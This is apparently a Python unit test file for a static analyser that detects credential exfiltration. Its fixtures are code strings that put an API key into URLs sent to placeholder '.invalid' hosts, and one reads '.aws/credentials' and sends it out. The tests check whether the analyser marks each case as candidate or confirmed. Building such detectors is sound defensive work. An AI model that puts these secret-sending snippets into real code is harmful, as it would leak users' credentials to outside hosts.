"""Literal URL components retain the same auth purpose as equivalent URL text."""
import unittest
from test_qindun_certify import MODULE
analyze = MODULE._python_flow_findings

PREFIX = 'import os, requests, urllib.request\nkey=os.getenv("API_KEY")\n'

VALID_URLS = [
    ('inline_format_path', '"https://service.invalid/v1/{model}?key={secret}".format(model="model-v1",secret=key)'),
    ('named_format_path', '"https://service.invalid/v1/{model}?key={secret}".format(model=model,secret=key)'),
    ('fstring_path', 'f"https://service.invalid/v1/{model}?key={key}"'),
    ('named_authority', 'f"https://{host}/v1/model?key={key}"'),
    ('named_query_parameter', 'f"https://service.invalid/v1/model?{field}={key}"'),
    ('encoded_literal_path', 'f"https://service.invalid/v1/{encoded}?key={key}"'),
]
LITERALS = 'model="model-v1"\nhost="service.invalid"\nfield="key"\nencoded="model%20one"\n'


class PythonLiteralUrlPartsTests(unittest.TestCase):
    def assert_scan(self, source, expected, output=False):
        hits, error = analyze("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            expected,
        )
        self.assertEqual(any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits), output)

    def test_literal_components_and_independent_risks(self):
        for name, expression in VALID_URLS:
            for mode in ("direct", "request", "log", "mixed"):
                with self.subTest(name=name, mode=mode):
                    source = PREFIX + LITERALS + f"url={expression}\n"
                    source += (
                        "req=urllib.request.Request(url)\nresponse=urllib.request.urlopen(req)\n"
                        if mode == "request" else "requests.get(url)\n"
                    )
                    if mode == "log":
                        source += "print(url)\n"
                    elif mode == "mixed":
                        source += 'requests.post("https://other.invalid",data=key)\n'
                    self.assert_scan(source, {"candidate", "confirmed"} if mode == "mixed" else {"candidate"}, mode == "log")

    def test_unknown_rebound_or_credential_components_remain_actionable(self):
        cases = [
            ('model=os.getenv("MODEL")\n', 'f"https://service.invalid/{model}?key={key}"'),
            ('model="fixed"\nmodel=os.getenv("MODEL")\n', 'f"https://service.invalid/{model}?key={key}"'),
            ('host=os.getenv("HOST")\n', 'f"https://{host}/?key={key}"'),
            ('model=key\n', 'f"https://service.invalid/{model}?key=public"'),
            ('model="fixed"\n', 'f"https://service.invalid/{model}?key={key}&dump={key}"'),
            ('model="fixed"\nkey=open(".aws/credentials").read()\n', 'f"https://service.invalid/{model}?key={key}"'),
            ('model="fixed"\nkey={"value":key}\n', 'f"https://service.invalid/{model}?key={key}"'),
            ('model="fixed"\nkey=[key]\n', 'f"https://service.invalid/{model}?key={key}"'),
            ('field="dump"\n', 'f"https://service.invalid/?{field}={key}"'),
            ('host="user@service.invalid"\n', 'f"https://{host}/?key={key}"'),
            ('host="service.invalid:8443"\n', 'f"https://{host}/?key={key}"'),
            ('model="%51INDUNQUERYVALUE0END"\n', 'f"https://service.invalid/{model}?key={key}"'),
            ('model="one"\nif choose:\n    model="two"\n', 'f"https://service.invalid/{model}?key={key}"'),
            ('model="fixed"\n', 'f"http://service.invalid/{model}?key={key}"'),
            ('model="fixed"\n', '"https://service.invalid/{model!r}?key={key}".format(model=model,key=key)'),
        ]
        for prefix, expression in cases:
            with self.subTest(prefix=prefix, expression=expression):
                self.assert_scan(PREFIX + prefix + f"requests.get({expression})\n", {"confirmed"})

    def test_literal_argument_and_alias_binding(self):
        self.assert_scan(
            PREFIX + 'model="fixed"\nold=model\nmodel=os.getenv("MODEL")\n'
            'def fetch(part,secret):\n'
            '    requests.get(f"https://service.invalid/{part}?key={secret}")\n'
            'fetch(old,key)\n',
            {"candidate"},
        )
